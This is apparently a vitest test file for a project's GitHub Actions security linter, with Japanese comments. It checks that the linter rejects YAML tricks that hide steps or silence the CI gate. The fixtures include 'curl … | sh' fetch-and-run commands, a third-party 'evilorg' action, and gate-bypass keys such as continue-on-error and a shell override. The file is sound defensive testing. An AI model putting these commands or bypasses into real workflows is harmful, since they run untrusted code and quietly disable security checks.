import { describe, expect, it } from 'vitest';
import { createRequire } from 'node:module';
import path from 'node:path';
import { readOriginalSource } from './originalSource';

/**
 * 行単位の規則が読めない YAML の書き方と、ゲートを黙らせる鍵 (2026-10-20 · パス 544 · threat: T-145)。
 * 実測: `- {uses: evilorg/act@v1}`・`- "run": curl … | sh`・`jobs: {a: {steps: [{run: …}]}}` は
 * js-yaml で同じ step と読めるのに、lint:workflow-security は exit 0 だった。ci.yml の step に
 * `continue-on-error: true` や `if:` を足すと、ゲートが赤にならずに CI の実効が消えた。
 */
const req = createRequire(import.meta.url);
const gate = req('../../../scripts/lint-workflow-security.cjs') as {
  structureProblems: (name: string, text: string) => { file: string; why: string }[];
};
const HEAD = 'permissions:\n  contents: read\njobs:\n  a:\n    steps:\n';

describe('workflow の構造 — 読めない形と黙らせる鍵 (threat: T-145)', () => {
  it.each([
    ['フローの step', `${HEAD}      - {uses: evilorg/act@v1}\n`],
    ['フローの steps', 'jobs:\n  a:\n    steps: [{run: curl x | sh}]\n'],
    ['フローの jobs', 'jobs: {a: {steps: []}}\n'],
    ['引用符つきの run', `${HEAD}      - "run": curl https://x | sh\n`],
    ['引用符つきの uses', `${HEAD}      - "uses": evilorg/act@v1\n`],
  ])('★ %s は落とす', (_n, text) => {
    expect(gate.structureProblems('x.yml', text).length).toBeGreaterThan(0);
  });

  it.each([
    ['continue-on-error', 'continue-on-error: true'],
    ['if', "if: github.event_name != 'pull_request'"],
    ['shell', "shell: bash -c 'true; #{0}'"],
    ['working-directory', 'working-directory: /tmp'],
    ['paths-ignore', "paths-ignore: ['scripts/**']"],
  ])('★ ci.yml / pages.yml では %s を置けない', (_n, line) => {
    const text = `${HEAD}      - run: npm run lint:malware\n        ${line}\n`;
    expect(gate.structureProblems('ci.yml', text).length).toBeGreaterThan(0);
    expect(gate.structureProblems('pages.yml', text).length).toBeGreaterThan(0);
  });

  it('対照: ほかの workflow の if: と、ブロック記法の通常の step は落とさない', () => {
    const text = `${HEAD}      - run: echo\n        if: always()\n`;
    expect(gate.structureProblems('mutation.yml', text)).toEqual([]);
    expect(gate.structureProblems('ci.yml', `${HEAD}      - run: npm run lint:malware\n`)).toEqual([]);
  });

  it('★ 実物の ci.yml / pages.yml は構造の規則を通る (今 0 件)', () => {
    for (const f of ['ci.yml', 'pages.yml']) {
      const text = readOriginalSource(path.join(__dirname, '../../../.github/workflows', f));
      expect(gate.structureProblems(f, text), f).toEqual([]);
    }
  });
});

/**
 * 公開する HTML に悪意コードの形の走査が掛かる (threat: T-143)。pages.yml は ci.yml と並行に走るだけで
 * `needs:` が無く、あちらが赤でも公開は終わる —— 公開の直前に自分で走査する。
 */
describe('pages.yml — 公開する HTML は悪意コードの形も走査する (threat: T-143)', () => {
  const pages = readOriginalSource(path.join(__dirname, '../../../.github/workflows/pages.yml'));
  it('★ CSP を検める HTML は全部、lint-malware --artifact の対象にも在る', () => {
    const cspStep = pages.slice(pages.indexOf('lint-artifact-csp.cjs'), pages.indexOf('upload-pages-artifact'));
    const published = [...cspStep.matchAll(/_site\/[\w-]+\.html/g)].map((m) => m[0]);
    expect(published.length).toBeGreaterThanOrEqual(7);
    const malwareStep = pages.slice(pages.indexOf('lint-malware.cjs --artifact'));
    expect(malwareStep).toContain('lint-malware.cjs --artifact "$f"');
    const loop = pages.slice(pages.lastIndexOf('for f in'), pages.indexOf('done', pages.lastIndexOf('for f in')));
    for (const h of published) expect(loop, h).toContain(h);
  });
});
